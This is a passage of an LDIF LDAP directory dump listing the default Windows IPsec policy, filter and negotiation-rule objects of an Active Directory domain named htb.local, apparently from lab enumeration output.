  Allow unsecured communication with clients that do not respond to request.
distinguishedName: CN=ipsecPolicy{72385230-70FA-11D1-864C-14A300000000},CN=IP 
 Security,CN=System,DC=htb,DC=local
instanceType: 4
whenCreated: 20190918174557.0Z
whenChanged: 20190918174557.0Z
uSNCreated: 5910
uSNChanged: 5910
showInAdvancedViewOnly: TRUE
name: ipsecPolicy{72385230-70FA-11D1-864C-14A300000000}
objectGUID:: hTEiJ+mitU2CJ/+XGTvxkw==
ipsecName: Server (Request Security)
ipsecID: {72385230-70FA-11D1-864C-14A300000000}
ipsecDataType: 598
ipsecData:: YyEgIkxP0RGGOwCgJI0wIQQAAAAwKgAAAA==
ipsecISAKMPReference: CN=ipsecISAKMPPolicy{72385231-70FA-11D1-864C-14A30000000
 0},CN=IP Security,CN=System,DC=htb,DC=local
ipsecNFAReference: CN=ipsecNFA{594272E2-071D-11D3-AD22-0060B0ECCA17},CN=IP Sec
 urity,CN=System,DC=htb,DC=local
ipsecNFAReference: CN=ipsecNFA{59319BE2-5EE3-11D2-ACE8-0060B0ECCA17},CN=IP Sec
 urity,CN=System,DC=htb,DC=local
ipsecNFAReference: CN=ipsecNFA{72385232-70FA-11D1-864C-14A300000000},CN=IP Sec
 urity,CN=System,DC=htb,DC=local
objectCategory: CN=Ipsec-Policy,CN=Schema,CN=Configuration,DC=htb,DC=local
isCriticalSystemObject: TRUE
dSCorePropagationData: 20201229124637.0Z
dSCorePropagationData: 20201229124637.0Z
dSCorePropagationData: 20201229124637.0Z
dSCorePropagationData: 20201229124637.0Z
dSCorePropagationData: 16010101000000.0Z

# ipsecISAKMPPolicy{72385231-70FA-11D1-864C-14A300000000}, IP Security, System,
  htb.local
dn: CN=ipsecISAKMPPolicy{72385231-70FA-11D1-864C-14A300000000},CN=IP Security,
 CN=System,DC=htb,DC=local
objectClass: top
objectClass: ipsecBase
objectClass: ipsecISAKMPPolicy
cn: ipsecISAKMPPolicy{72385231-70FA-11D1-864C-14A300000000}
distinguishedName: CN=ipsecISAKMPPolicy{72385231-70FA-11D1-864C-14A300000000},
 CN=IP Security,CN=System,DC=htb,DC=local
instanceType: 4
whenCreated: 20190918174557.0Z
whenChanged: 20190918174557.0Z
uSNCreated: 5911
uSNChanged: 5911
showInAdvancedViewOnly: TRUE
name: ipsecISAKMPPolicy{72385231-70FA-11D1-864C-14A300000000}
objectGUID:: muWY9hEWL0efMjMjNnSFfg==
ipsecID: {72385231-70FA-11D1-864C-14A300000000}
ipsecDataType: 598
ipsecData:: 
ipsecOwnersReference: CN=ipsecPolicy{72385230-70FA-11D1-864C-14A300000000},CN=
 IP Security,CN=System,DC=htb,DC=local
objectCategory: CN=Ipsec-ISAKMP-Policy,CN=Schema,CN=Configuration,DC=htb,DC=lo
 cal
isCriticalSystemObject: TRUE
dSCorePropagationData: 20201229124638.0Z
dSCorePropagationData: 20201229124638.0Z
dSCorePropagationData: 20201229124638.0Z
dSCorePropagationData: 20201229124637.0Z
dSCorePropagationData: 16010101000000.0Z

# ipsecNFA{72385232-70FA-11D1-864C-14A300000000}, IP Security, System, htb.loca
 l
dn: CN=ipsecNFA{72385232-70FA-11D1-864C-14A300000000},CN=IP Security,CN=System
 ,DC=htb,DC=local
objectClass: top
objectClass: ipsecBase
objectClass: ipsecNFA
cn: ipsecNFA{72385232-70FA-11D1-864C-14A300000000}
description: For all IP traffic, always request security using Kerberos trust.
  Allow unsecured communication with clients that do not respond to request.
distinguishedName: CN=ipsecNFA{72385232-70FA-11D1-864C-14A300000000},CN=IP Sec
 urity,CN=System,DC=htb,DC=local
instanceType: 4
whenCreated: 20190918174557.0Z
whenChanged: 20190918174557.0Z
uSNCreated: 5912
uSNChanged: 5912
showInAdvancedViewOnly: TRUE
name: ipsecNFA{72385232-70FA-11D1-864C-14A300000000}
objectGUID:: kf99QcMGZk2+QDNa0/046w==
ipsecName: Request Security (Optional) Rule
ipsecID: {72385232-70FA-11D1-864C-14A300000000}
ipsecDataType: 598
ipsecData:: AKy7EY1J0RGGOQCgJI0wISoAAAABAAAABQAAAAIAAAAAAP3///8CAAAAAAAAAAAAAA
 AAAAEAAAACAAAAAAAA
ipsecOwnersReference: CN=ipsecPolicy{72385230-70FA-11D1-864C-14A300000000},CN=
 IP Security,CN=System,DC=htb,DC=local
ipsecNegotiationPolicyReference: CN=ipsecNegotiationPolicy{72385233-70FA-11D1-
 864C-14A300000000},CN=IP Security,CN=System,DC=htb,DC=local
ipsecFilterReference: CN=ipsecFilter{7238523A-70FA-11D1-864C-14A300000000},CN=
 IP Security,CN=System,DC=htb,DC=local
objectCategory: CN=Ipsec-NFA,CN=Schema,CN=Configuration,DC=htb,DC=local
isCriticalSystemObject: TRUE
dSCorePropagationData: 20201229124638.0Z
dSCorePropagationData: 20201229124638.0Z
dSCorePropagationData: 20201229124638.0Z
dSCorePropagationData: 20201229124637.0Z
dSCorePropagationData: 16010101000000.0Z

# ipsecNFA{59319BE2-5EE3-11D2-ACE8-0060B0ECCA17}, IP Security, System, htb.loca
 l
dn: CN=ipsecNFA{59319BE2-5EE3-11D2-ACE8-0060B0ECCA17},CN=IP Security,CN=System
 ,DC=htb,DC=local
objectClass: top
objectClass: ipsecBase
objectClass: ipsecNFA
cn: ipsecNFA{59319BE2-5EE3-11D2-ACE8-0060B0ECCA17}
distinguishedName: CN=ipsecNFA{59319BE2-5EE3-11D2-ACE8-0060B0ECCA17},CN=IP Sec
 urity,CN=System,DC=htb,DC=local
instanceType: 4
whenCreated: 20190918174557.0Z
whenChanged: 20190918174557.0Z
uSNCreated: 5913
uSNChanged: 5913
showInAdvancedViewOnly: TRUE
name: ipsecNFA{59319BE2-5EE3-11D2-ACE8-0060B0ECCA17}
objectGUID:: 1h15lSQBsUquPFdpI+s7vg==
ipsecID: {59319BE2-5EE3-11D2-ACE8-0060B0ECCA17}
ipsecDataType: 598
ipsecData:: AKy7EY1J0RGGOQCgJI0wISoAAAABAAAABQAAAAIAAAAAAP3///8CAAAAAAAAAAAAAA
 AAAAEAAAACAAAAAAAA
ipsecOwnersReference: CN=ipsecPolicy{72385230-70FA-11D1-864C-14A300000000},CN=
 IP Security,CN=System,DC=htb,DC=local
ipsecNegotiationPolicyReference: CN=ipsecNegotiationPolicy{59319BDF-5EE3-11D2-
 ACE8-0060B0ECCA17},CN=IP Security,CN=System,DC=htb,DC=local
objectCategory: CN=Ipsec-NFA,CN=Schema,CN=Configuration,DC=htb,DC=local
isCriticalSystemObject: TRUE
dSCorePropagationData: 20201229124638.0Z
dSCorePropagationData: 20201229124638.0Z
dSCorePropagationData: 20201229124638.0Z
dSCorePropagationData: 20201229124637.0Z
dSCorePropagationData: 16010101000000.0Z

# ipsecNFA{594272E2-071D-11D3-AD22-0060B0ECCA17}, IP Security, System, htb.loca
 l
dn: CN=ipsecNFA{594272E2-071D-11D3-AD22-0060B0ECCA17},CN=IP Security,CN=System
 ,DC=htb,DC=local
objectClass: top
objectClass: ipsecBase
objectClass: ipsecNFA
cn: ipsecNFA{594272E2-071D-11D3-AD22-0060B0ECCA17}
description: Permit unsecure ICMP packets to pass through.
distinguishedName: CN=ipsecNFA{594272E2-071D-11D3-AD22-0060B0ECCA17},CN=IP Sec
 urity,CN=System,DC=htb,DC=local
instanceType: 4
whenCreated: 20190918174557.0Z
whenChanged: 20190918174557.0Z
uSNCreated: 5914
uSNChanged: 5914
showInAdvancedViewOnly: TRUE
name: ipsecNFA{594272E2-071D-11D3-AD22-0060B0ECCA17}
objectGUID:: nPY/ol2nW0yauUUsfncUzQ==
ipsecName: Permit unsecure ICMP packets to pass through.
ipsecID: {594272E2-071D-11D3-AD22-0060B0ECCA17}
ipsecDataType: 598
ipsecData:: AKy7EY1J0RGGOQCgJI0wISoAAAABAAAABQAAAAIAAAAAAP3///8CAAAAAAAAAAAAAA
 AAAAEAAAACAAAAAAAA
ipsecOwnersReference: CN=ipsecPolicy{72385230-70FA-11D1-864C-14A300000000},CN=
 IP Security,CN=System,DC=htb,DC=local
ipsecNegotiationPolicyReference: CN=ipsecNegotiationPolicy{7238523B-70FA-11D1-
 864C-14A300000000},CN=IP Security,CN=System,DC=htb,DC=local
ipsecFilterReference: CN=ipsecFilter{72385235-70FA-11D1-864C-14A300000000},CN=
 IP Security,CN=System,DC=htb,DC=local
objectCategory: CN=Ipsec-NFA,CN=Schema,CN=Configuration,DC=htb,DC=local
isCriticalSystemObject: TRUE
dSCorePropagationData: 20201229124638.0Z
dSCorePropagationData: 20201229124638.0Z
dSCorePropagationData: 20201229124638.0Z
dSCorePropagationData: 20201229124637.0Z
dSCorePropagationData: 16010101000000.0Z

# ipsecNegotiationPolicy{72385233-70FA-11D1-864C-14A300000000}, IP Security, Sy
 stem, htb.local
dn: CN=ipsecNegotiationPolicy{72385233-70FA-11D1-864C-14A300000000},CN=IP Secu
 rity,CN=System,DC=htb,DC=local
objectClass: top
objectClass: ipsecBase
objectClass: ipsecNegotiationPolicy
cn: ipsecNegotiationPolicy{72385233-70FA-11D1-864C-14A300000000}
description: Accepts unsecured communication, but requests clients to establis
 h trust and security methods.  Will communicate insecurely to untrusted clien
 ts if they do not respond to request.
distinguishedName: CN=ipsecNegotiationPolicy{72385233-70FA-11D1-864C-14A300000
 000},CN=IP Security,CN=System,DC=htb,DC=local
instanceType: 4
whenCreated: 20190918174557.0Z
whenChanged: 20190918174557.0Z
uSNCreated: 5927
uSNChanged: 5927
showInAdvancedViewOnly: TRUE
name: ipsecNegotiationPolicy{72385233-70FA-11D1-864C-14A300000000}
objectGUID:: Uud4jD+iWk61vDF0/pFc1Q==
ipsecName: Request Security (Optional)
ipsecID: {72385233-70FA-11D1-864C-14A300000000}
ipsecDataType: 598
ipsecData:: 
ipsecOwnersReference: CN=ipsecNFA{72385232-70FA-11D1-864C-14A300000000},CN=IP 
 Security,CN=System,DC=htb,DC=local
objectCategory: CN=Ipsec-Negotiation-Policy,CN=Schema,CN=Configuration,DC=htb,
 DC=local
isCriticalSystemObject: TRUE
iPSECNegotiationPolicyType: {62F49E10-6C37-11D1-864C-14A300000000}
iPSECNegotiationPolicyAction: {3F91A81A-7647-11D1-864D-D46A00000000}
dSCorePropagationData: 20201229124638.0Z
dSCorePropagationData: 20201229124638.0Z
dSCorePropagationData: 20201229124638.0Z
dSCorePropagationData: 20201229124637.0Z
dSCorePropagationData: 16010101000000.0Z

# ipsecFilter{7238523A-70FA-11D1-864C-14A300000000}, IP Security, System, htb.l
 ocal
dn: CN=ipsecFilter{7238523A-70FA-11D1-864C-14A300000000},CN=IP Security,CN=Sys
 tem,DC=htb,DC=local
objectClass: top
objectClass: ipsecBase
objectClass: ipsecFilter
cn: ipsecFilter{7238523A-70FA-11D1-864C-14A300000000}
description: Matches all IP packets from this computer to any other computer, 
 except broadcast, multicast, Kerberos, RSVP and ISAKMP (IKE).
distinguishedName: CN=ipsecFilter{7238523A-70FA-11D1-864C-14A300000000},CN=IP 
 Security,CN=System,DC=htb,DC=local
instanceType: 4
whenCreated: 20190918174557.0Z
whenChanged: 20190918174557.0Z
uSNCreated: 5930
uSNChanged: 5930
showInAdvancedViewOnly: TRUE
name: ipsecFilter{7238523A-70FA-11D1-864C-14A300000000}
objectGUID:: Ka/tgGlmJUeCjicrJDuhQA==
ipsecName: All IP Traffic
ipsecID: {7238523A-70FA-11D1-864C-14A300000000}
ipsecDataType: 598
ipsecData:: tSDcgMgu0RGongCgJI0wIUoAAAABAAAAAgAAAAAAAgAAAAAAAgAAAAAA3ZsxWeNe0h
 Gs6ABgsOzKFwEAAAAAAAAA/////wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=
ipsecOwnersReference: CN=ipsecNFA{72385232-70FA-11D1-864C-14A300000000},CN=IP 
 Security,CN=System,DC=htb,DC=local
ipsecOwnersReference: CN=ipsecNFA{7238523E-70FA-11D1-864C-14A300000000},CN=IP 
 Security,CN=System,DC=htb,DC=local
objectCategory: CN=Ipsec-Filter,CN=Schema,CN=Configuration,DC=htb,DC=local
isCriticalSystemObject: TRUE
dSCorePropagationData: 20201229124638.0Z
dSCorePropagationData: 20201229124638.0Z
dSCorePropagationData: 20201229124638.0Z
dSCorePropagationData: 20201229124637.0Z
dSCorePropagationData: 16010101000000.0Z

# ipsecNegotiationPolicy{59319BDF-5EE3-11D2-ACE8-0060B0ECCA17}, IP Security, Sy
 stem, htb.local
dn: CN=ipsecNegotiationPolicy{59319BDF-5EE3-11D2-ACE8-0060B0ECCA17},CN=IP Secu
 rity,CN=System,DC=htb,DC=local
objectClass: top
objectClass: ipsecBase
objectClass: ipsecNegotiationPolicy
cn: ipsecNegotiationPolicy{59319BDF-5EE3-11D2-ACE8-0060B0ECCA17}
distinguishedName: CN=ipsecNegotiationPolicy{59319BDF-5EE3-11D2-ACE8-0060B0ECC
 A17},CN=IP Security,CN=System,DC=htb,DC=local
instanceType: 4
whenCreated: 20190918174557.0Z
whenChanged: 20190918174557.0Z
uSNCreated: 5924
uSNChanged: 5924
showInAdvancedViewOnly: TRUE
name: ipsecNegotiationPolicy{59319BDF-5EE3-11D2-ACE8-0060B0ECCA17}
objectGUID:: qGfSF7RNB068JyjId3/GPA==
ipsecID: {59319BDF-5EE3-11D2-ACE8-0060B0ECCA17}
ipsecDataType: 598
ipsecData:: 
ipsecOwnersReference: CN=ipsecNFA{59319BE2-5EE3-11D2-ACE8-0060B0ECCA17},CN=IP 
 Security,CN=System,DC=htb,DC=local
objectCategory: CN=Ipsec-Negotiation-Policy,CN=Schema,CN=Configuration,DC=htb,
 DC=local
isCriticalSystemObject: TRUE
iPSECNegotiationPolicyType: {62F49E13-6C37-11D1-864C-14A300000000}
iPSECNegotiationPolicyAction: {8A171DD3-77E3-11D1-8659-A04F00000000}
dSCorePropagationData: 20201229124638.0Z
dSCorePropagationData: 20201229124638.0Z
dSCorePropagationData: 20201229124638.0Z
dSCorePropagationData: 20201229124637.0Z
dSCorePropagationData: 16010101000000.0Z

# ipsecNegotiationPolicy{7238523B-70FA-11D1-864C-14A300000000}, IP Security, Sy
 stem, htb.local
dn: CN=ipsecNegotiationPolicy{7238523B-70FA-11D1-864C-14A300000000},CN=IP Secu
 rity,CN=System,DC=htb,DC=local
objectClass: top
objectClass: ipsecBase
objectClass: ipsecNegotiationPolicy
cn: ipsecNegotiationPolicy{7238523B-70FA-11D1-864C-14A300000000}
description: Permit unsecured IP packets to pass through.
distinguishedName: CN=ipsecNegotiationPolicy{7238523B-70FA-11D1-864C-14A300000
 000},CN=IP Security,CN=System,DC=htb,DC=local
instanceType: 4
whenCreated: 20190918174557.0Z
whenChanged: 20190918174557.0Z
uSNCreated: 5929
uSNChanged: 5929
showInAdvancedViewOnly: TRUE
name: ipsecNegotiationPolicy{7238523B-70FA-11D1-864C-14A300000000}
objectGUID:: M75l4YJVj0ysXdZk+y2M9w==
ipsecName: Permit
ipsecID: {7238523B-70FA-11D1-864C-14A300000000}
ipsecDataType: 598
ipsecData:: uSDcgMgu0RGongCgJI0wIQQAAAAAAAAAAA==
ipsecOwnersReference: CN=ipsecNFA{594272E2-071D-11D3-AD22-0060B0ECCA17},CN=IP 
 Security,CN=System,DC=htb,DC=local
ipsecOwnersReference: CN=ipsecNFA{594272FD-071D-11D3-AD22-0060B0ECCA17},CN=IP 
 Security,CN=System,DC=htb,DC=local
objectCategory: CN=Ipsec-Negotiation-Policy,CN=Schema,CN=Configuration,DC=htb,
 DC=local
isCriticalSystemObject: TRUE
iPSECNegotiationPolicyType: {62F49E10-6C37-11D1-864C-14A300000000}
iPSECNegotiationPolicyAction: {8A171DD2-77E3-11D1-8659-A04F00000000}
dSCorePropagationData: 20201229124638.0Z
dSCorePropagationData: 20201229124638.0Z
dSCorePropagationData: 20201229124638.0Z
dSCorePropagationData: 20201229124637.0Z
dSCorePropagationData: 16010101000000.0Z

# ipsecFilter{72385235-70FA-11D1-864C-14A300000000}, IP Security, System, htb.l
 ocal
dn: CN=ipsecFilter{72385235-70FA-11D1-864C-14A300000000},CN=IP Security,CN=Sys
 tem,DC=htb,DC=local
objectClass: top
objectClass: ipsecBase
objectClass: ipsecFilter
cn: ipsecFilter{72385235-70FA-11D1-864C-14A300000000}
description: Matches all ICMP packets between this computer and any other comp
 uter.
distinguishedName: CN=ipsecFilter{72385235-70FA-11D1-864C-14A300000000},CN=IP 
 Security,CN=System,DC=htb,DC=local
instanceType: 4
whenCreated: 20190918174557.0Z
whenChanged: 20190918174557.0Z
uSNCreated: 5931
uSNChanged: 5931
showInAdvancedViewOnly: TRUE
name: ipsecFilter{72385235-70FA-11D1-864C-14A300000000}
objectGUID:: QIIXSiHdYEqF3aXATvx4Xw==
ipsecName: All ICMP Traffic
ipsecID: {72385235-70FA-11D1-864C-14A300000000}
ipsecDataType: 598
ipsecData:: tSDcgMgu0RGongCgJI0wIVIAAAABAAAAAgAAAAAAAgAAAAAACgAAAEkAQwBNAFAAAA
 Bj0hlRHQfTEa0iAGCw7MoXAQAAAAAAAAD/////AAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAA==
ipsecOwnersReference: CN=ipsecNFA{594272E2-071D-11D3-AD22-0060B0ECCA17},CN=IP 
 Security,CN=System,DC=htb,DC=local
ipsecOwnersReference: CN=ipsecNFA{594272FD-071D-11D3-AD22-0060B0ECCA17},CN=IP 
 Security,CN=System,DC=htb,DC=local
objectCategory: CN=Ipsec-Filter,CN=Schema,CN=Configuration,DC=htb,DC=local
isCriticalSystemObject: TRUE
dSCorePropagationData: 20201229124638.0Z
dSCorePropagationData: 20201229124638.0Z
dSCorePropagationData: 20201229124638.0Z
dSCorePropagationData: 20201229124637.0Z
dSCorePropagationData: 16010101000000.0Z

# ipsecPolicy{72385236-70FA-11D1-864C-14A300000000}, IP Security, System, htb.l
 ocal
dn: CN=ipsecPolicy{72385236-70FA-11D1-864C-14A300000000},CN=IP Security,CN=Sys
 tem,DC=htb,DC=local
objectClass: top
objectClass: ipsecBase
objectClass: ipsecPolicy
cn: ipsecPolicy{72385236-70FA-11D1-864C-14A300000000}
description: Communicate normally (unsecured). Use the default response rule t
 o negotiate with servers that request security. Only the requested protocol a
 nd port traffic with that server is secured.
distinguishedName: CN=ipsecPolicy{72385236-70FA-11D1-864C-14A300000000},CN=IP 
 Security,CN=System,DC=htb,DC=local
instanceType: 4
whenCreated: 20190918174557.0Z
whenChanged: 20190918174557.0Z
uSNCreated: 5915
uSNChanged: 5915
showInAdvancedViewOnly: TRUE
name: ipsecPolicy{72385236-70FA-11D1-864C-14A300000000}
objectGUID:: cPYChST2U0C4ckLFp3gmlg==
ipsecName: Client (Respond Only)
ipsecID: {72385236-70FA-11D1-864C-14A300000000}
ipsecDataType: 598
ipsecData:: YyEgIkxP0RGGOwCgJI0wIQQAAAAwKgAAAA==
ipsecISAKMPReference: CN=ipsecISAKMPPolicy{72385237-70FA-11D1-864C-14A30000000
 0},CN=IP Security,CN=System,DC=htb,DC=local
ipsecNFAReference: CN=ipsecNFA{59319C04-5EE3-11D2-ACE8-0060B0ECCA17},CN=IP Sec
 urity,CN=System,DC=htb,DC=local
objectCategory: CN=Ipsec-Policy,CN=Schema,CN=Configuration,DC=htb,DC=local
isCriticalSystemObject: TRUE
dSCorePropagationData: 20201229124638.0Z
dSCorePropagationData: 20201229124638.0Z
dSCorePropagationData: 20201229124638.0Z
dSCorePropagationData: 20201229124637.0Z
dSCorePropagationData: 16010101000000.0Z

# ipsecISAKMPPolicy{72385237-70FA-11D1-864C-14A300000000}, IP Security, System,
  htb.local
dn: CN=ipsecISAKMPPolicy{72385237-70FA-11D1-864C-14A300000000},CN=IP Security,
 CN=System,DC=htb,DC=local
objectClass: top
objectClass: ipsecBase
objectClass: ipsecISAKMPPolicy
cn: ipsecISAKMPPolicy{72385237-70FA-11D1-864C-14A300000000}
distinguishedName: CN=ipsecISAKMPPolicy{72385237-70FA-11D1-864C-14A300000000},
 CN=IP Security,CN=System,DC=htb,DC=local
instanceType: 4
whenCreated: 20190918174557.0Z
whenChanged: 20190918174557.0Z
uSNCreated: 5916
uSNChanged: 5916
showInAdvancedViewOnly: TRUE
name: ipsecISAKMPPolicy{72385237-70FA-11D1-864C-14A300000000}
objectGUID:: SYIAHLrZnUuU2HdsIlckVQ==
ipsecID: {72385237-70FA-11D1-864C-14A300000000}
ipsecDataType: 598
ipsecData:: 
ipsecOwnersReference: CN=ipsecPolicy{72385236-70FA-11D1-864C-14A300000000},CN=
 IP Security,CN=System,DC=htb,DC=local
objectCategory: CN=Ipsec-ISAKMP-Policy,CN=Schema,CN=Configuration,DC=htb,DC=lo
 cal
isCriticalSystemObject: TRUE
dSCorePropagationData: 20201229124638.0Z
dSCorePropagationData: 20201229124638.0Z
dSCorePropagationData: 20201229124638.0Z
dSCorePropagationData: 20201229124637.0Z
dSCorePropagationData: 16010101000000.0Z

# ipsecNFA{59319C04-5EE3-11D2-ACE8-0060B0ECCA17}, IP Security, System, htb.loca
 l
dn: CN=ipsecNFA{59319C04-5EE3-11D2-ACE8-0060B0ECCA17},CN=IP Security,CN=System
 ,DC=htb,DC=local
objectClass: top
objectClass: ipsecBase
objectClass: ipsecNFA
cn: ipsecNFA{59319C04-5EE3-11D2-ACE8-0060B0ECCA17}
distinguishedName: CN=ipsecNFA{59319C04-5EE3-11D2-ACE8-0060B0ECCA17},CN=IP Sec
 urity,CN=System,DC=htb,DC=local
instanceType: 4
whenCreated: 20190918174557.0Z
whenChanged: 20190918174557.0Z
uSNCreated: 5917
uSNChanged: 5917
showInAdvancedViewOnly: TRUE
name: ipsecNFA{59319C04-5EE3-11D2-ACE8-0060B0ECCA17}
objectGUID:: 8cfOAaAsvk6OF/kCU3BtQQ==
ipsecID: {59319C04-5EE3-11D2-ACE8-0060B0ECCA17}
ipsecDataType: 598
ipsecData:: AKy7EY1J0RGGOQCgJI0wISoAAAABAAAABQAAAAIAAAAAAP3///8CAAAAAAAAAAAAAA
 AAAAEAAAACAAAAAAAA
ipsecOwnersReference: CN=ipsecPolicy{72385236-70FA-11D1-864C-14A300000000},CN=
 IP Security,CN=System,DC=htb,DC=local
ipsecNegotiationPolicyReference: CN=ipsecNegotiationPolicy{59319C01-5EE3-11D2-
 ACE8-0060B0ECCA17},CN=IP Security,CN=System,DC=htb,DC=local
objectCategory: CN=Ipsec-NFA,CN=Schema,CN=Configuration,DC=htb,DC=local
isCriticalSystemObject: TRUE
dSCorePropagationData: 20201229124638.0Z
dSCorePropagationData: 20201229124638.0Z
dSCorePropagationData: 20201229124638.0Z
dSCorePropagationData: 20201229124637.0Z
dSCorePropagationData: 16010101000000.0Z

# ipsecNegotiationPolicy{59319C01-5EE3-11D2-ACE8-0060B0ECCA17}, IP Security, Sy
 stem, htb.local
dn: CN=ipsecNegotiationPolicy{59319C01-5EE3-11D2-ACE8-0060B0ECCA17},CN=IP Secu
 rity,CN=System,DC=htb,DC=local
objectClass: top
objectClass: ipsecBase
objectClass: ipsecNegotiationPolicy
cn: ipsecNegotiationPolicy{59319C01-5EE3-11D2-ACE8-0060B0ECCA17}
distinguishedName: CN=ipsecNegotiationPolicy{59319C01-5EE3-11D2-ACE8-0060B0ECC
 A17},CN=IP Security,CN=System,DC=htb,DC=local
instanceType: 4
whenCreated: 20190918174557.0Z
whenChanged: 20190918174557.0Z
uSNCreated: 5926
uSNChanged: 5926
showInAdvancedViewOnly: TRUE
name: ipsecNegotiationPolicy{59319C01-5EE3-11D2-ACE8-0060B0ECCA17}
objectGUID:: /v7LshaQvUKRgsZ+aqCFag==
ipsecID: {59319C01-5EE3-11D2-ACE8-0060B0ECCA17}
ipsecDataType: 598
ipsecData:: 
ipsecOwnersReference: CN=ipsecNFA{59319C04-5EE3-11D2-ACE8-0060B0ECCA17},CN=IP 
 Security,CN=System,DC=htb,DC=local
objectCategory: CN=Ipsec-Negotiation-Policy,CN=Schema,CN=Configuration,DC=htb,
 DC=local
isCriticalSystemObject: TRUE
iPSECNegotiationPolicyType: {62F49E13-6C37-11D1-864C-14A300000000}
iPSECNegotiationPolicyAction: {8A171DD3-77E3-11D1-8659-A04F00000000}
dSCorePropagationData: 20201229124638.0Z
dSCorePropagationData: 20201229124638.0Z
dSCorePropagationData: 20201229124638.0Z
dSCorePropagationData: 20201229124637.0Z
dSCorePropagationData: 16010101000000.0Z

# ipsecPolicy{7238523C-70FA-11D1-864C-14A300000000}, IP Security, System, htb.l
 ocal
dn: CN=ipsecPolicy{7238523C-70FA-11D1-864C-14A300000000},CN=IP Security,CN=Sys
 tem,DC=htb,DC=local
objectClass: top
objectClass: ipsecBase
objectClass: ipsecPolicy
cn: ipsecPolicy{7238523C-70FA-11D1-864C-14A300000000}
description: For all IP traffic, always require security using Kerberos trust.
  Do NOT allow unsecured communication with untrusted clients.
distinguishedName: CN=ipsecPolicy{7238523C-70FA-11D1-864C-14A300000000},CN=IP 
 Security,CN=System,DC=htb,DC=local
instanceType: 4
whenCreated: 20190918174557.0Z
whenChanged: 20190918174557.0Z
uSNCreated: 5918
uSNChanged: 5918
showInAdvancedViewOnly: TRUE
name: ipsecPolicy{7238523C-70FA-11D1-864C-14A300000000}
objectGUID:: euSU3DPx90GYMYWalrIBEQ==
ipsecName: Secure Server (Require Security)
ipsecID: {7238523C-70FA-11D1-864C-14A300000000}
ipsecDataType: 598
ipsecData:: YyEgIkxP0RGGOwCgJI0wIQQAAAAwKgAAAA==
ipsecISAKMPReference: CN=ipsecISAKMPPolicy{7238523D-70FA-11D1-864C-14A30000000
 0},CN=IP Security,CN=System,DC=htb,DC=local
ipsecNFAReference: CN=ipsecNFA{594272FD-071D-11D3-AD22-0060B0ECCA17},CN=IP Sec
 urity,CN=System,DC=htb,DC=local
ipsecNFAReference: CN=ipsecNFA{59319BF3-5EE3-11D2-ACE8-0060B0ECCA17},CN=IP Sec
 urity,CN=System,DC=htb,DC=local
ipsecNFAReference: CN=ipsecNFA{7238523E-70FA-11D1-864C-14A300000000},CN=IP Sec
 urity,CN=System,DC=htb,DC=local
objectCategory: CN=Ipsec-Policy,CN=Schema,CN=Configuration,DC=htb,DC=local
isCriticalSystemObject: TRUE
dSCorePropagationData: 20201229124638.0Z
dSCorePropagationData: 20201229124638.0Z
dSCorePropagationData: 20201229124638.0Z
dSCorePropagationData: 20201229124637.0Z
dSCorePropagationData: 16010101000000.0Z

# ipsecISAKMPPolicy{7238523D-70FA-11D1-864C-14A300000000}, IP Security, System,
  htb.local
dn: CN=ipsecISAKMPPolicy{7238523D-70FA-11D1-864C-14A300000000},CN=IP Security,
 CN=System,DC=htb,DC=local
objectClass: top
objectClass: ipsecBase
objectClass: ipsecISAKMPPolicy
cn: ipsecISAKMPPolicy{7238523D-70FA-11D1-864C-14A300000000}
distinguishedName: CN=ipsecISAKMPPolicy{7238523D-70FA-11D1-864C-14A300000000},
 CN=IP Security,CN=System,DC=htb,DC=local
instanceType: 4
whenCreated: 20190918174557.0Z
whenChanged: 20190918174557.0Z
uSNCreated: 5919
uSNChanged: 5919
showInAdvancedViewOnly: TRUE
name: ipsecISAKMPPolicy{7238523D-70FA-11D1-864C-14A300000000}
objectGUID:: uOxt+UqDMUm2J8sMGND8CQ==
ipsecID: {7238523D-70FA-11D1-864C-14A300000000}
ipsecDataType: 598
ipsecData:: 
ipsecOwnersReference: CN=ipsecPolicy{7238523C-70FA-11D1-864C-14A300000000},CN=
 IP Security,CN=System,DC=htb,DC=local
objectCategory: CN=Ipsec-ISAKMP-Policy,CN=Schema,CN=Configuration,DC=htb,DC=lo
 cal
isCriticalSystemObject: TRUE
dSCorePropagationData: 20201229124638.0Z
dSCorePropagationData: 20201229124638.0Z
dSCorePropagationData: 20201229124638.0Z
dSCorePropagationData: 20201229124637.0Z
dSCorePropagationData: 16010101000000.0Z

# ipsecNFA{7238523E-70FA-11D1-864C-14A300000000}, IP Security, System, htb.loca
 l
dn: CN=ipsecNFA{7238523E-70FA-11D1-864C-14A300000000},CN=IP Security,CN=System
 ,DC=htb,DC=local
objectClass: top
objectClass: ipsecBase
objectClass: ipsecNFA
cn: ipsecNFA{7238523E-70FA-11D1-864C-14A300000000}
description: Accepts unsecured communication, but always requires clients to e
 stablish trust and security methods.  Will NOT communicate with untrusted cli
 ents.
distinguishedName: CN=ipsecNFA{7238523E-70FA-11D1-864C-14A300000000},CN=IP Sec
 urity,CN=System,DC=htb,DC=local
instanceType: 4
whenCreated: 20190918174557.0Z
whenChanged: 20190918174557.0Z
uSNCreated: 5920
uSNChanged: 5920
showInAdvancedViewOnly: TRUE
name: ipsecNFA{7238523E-70FA-11D1-864C-14A300000000}
objectGUID:: P7lWZvvZp0GuNpFlaj/eig==
ipsecName: Require Security
ipsecID: {7238523E-70FA-11D1-864C-14A300000000}
ipsecDataType: 598
ipsecData:: AKy7EY1J0RGGOQCgJI0wISoAAAABAAAABQAAAAIAAAAAAP3///8CAAAAAAAAAAAAAA
 AAAAEAAAACAAAAAAAA
ipsecOwnersReference: CN=ipsecPolicy{7238523C-70FA-11D1-864C-14A300000000},CN=
 IP Security,CN=System,DC=htb,DC=local
ipsecNegotiationPolicyReference: CN=ipsecNegotiationPolicy{7238523F-70FA-11D1-
 864C-14A300000000},CN=IP Security,CN=System,DC=htb,DC=local
ipsecFilterReference: CN=ipsecFilter{7238523A-70FA-11D1-864C-14A300000000},CN=
 IP Security,CN=System,DC=htb,DC=local
objectCategory: CN=Ipsec-NFA,CN=Schema,CN=Configuration,DC=htb,DC=local
isCriticalSystemObject: TRUE
dSCorePropagationData: 20201229124638.0Z
dSCorePropagationData: 20201229124638.0Z
dSCorePropagationData: 20201229124638.0Z
dSCorePropagationData: 20201229124637.0Z
dSCorePropagationData: 16010101000000.0Z

